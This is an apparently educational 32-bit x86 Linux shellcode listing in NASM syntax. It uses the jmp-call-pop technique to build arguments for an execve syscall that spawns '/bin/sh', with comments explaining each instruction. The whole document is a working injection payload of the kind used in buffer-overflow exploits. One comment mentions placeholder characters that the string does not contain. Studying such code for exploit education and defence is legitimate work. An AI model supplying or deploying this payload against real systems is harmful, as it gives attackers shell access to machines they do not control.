BITS 32

  jmp short two;
  
  one:
    pop ebx;
    xor eax,eax; zero eax
    mov [ebx+7], al; null terminate the string
    mov [ebx+8], ebx; move address of ebx after the string
    mov [ebx+12], eax; place 32 bit null terminator after
    lea ecx, [ebx+8]; load address of argument pointer array into ecx
    lea edx, [ebx+12]; load address of null array for environment variablesn
    mov al, 11; syscall 11
    int 0x80; do syscall
  
  two:
    call one; pop address of shellcode into ebx
    db "/bin/sh"; // the X,A and B's are there but are copied over by the one function